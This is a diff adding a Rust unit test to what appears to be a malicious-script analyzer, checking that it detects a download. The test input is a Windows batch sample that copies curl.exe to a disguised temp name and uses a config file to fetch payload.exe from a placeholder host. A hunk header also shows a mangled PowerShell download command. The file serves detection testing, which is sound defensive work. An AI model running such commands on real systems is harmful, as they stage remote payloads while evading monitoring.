@@ -42695,6 +42695,31 @@ powershll.exe -mmand"(Nw-ject-ypame Sstem.Net.Welint).Dwnloadile('https://raw.ex
     }
 
     #[test]
+    fn copied_curl_alias_config_file_emits_structured_download() {
+        let report = analyze(
+            br#"copy C:\Windows\System32\curl.exe C:\Users\Public\cu.tmp
+echo url = "https://copied-curl-config.example/payload.exe">curl.cfg
+echo output = "payload.exe">>curl.cfg
+C:\Users\Public\cu.tmp -K curl.cfg
+"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://copied-curl-config.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "copied curl config file did not emit structured Download: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn copied_curl_alias_liberal_url_in_deob_text_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         env.traits.push(Trait::WindowsUtilManip {
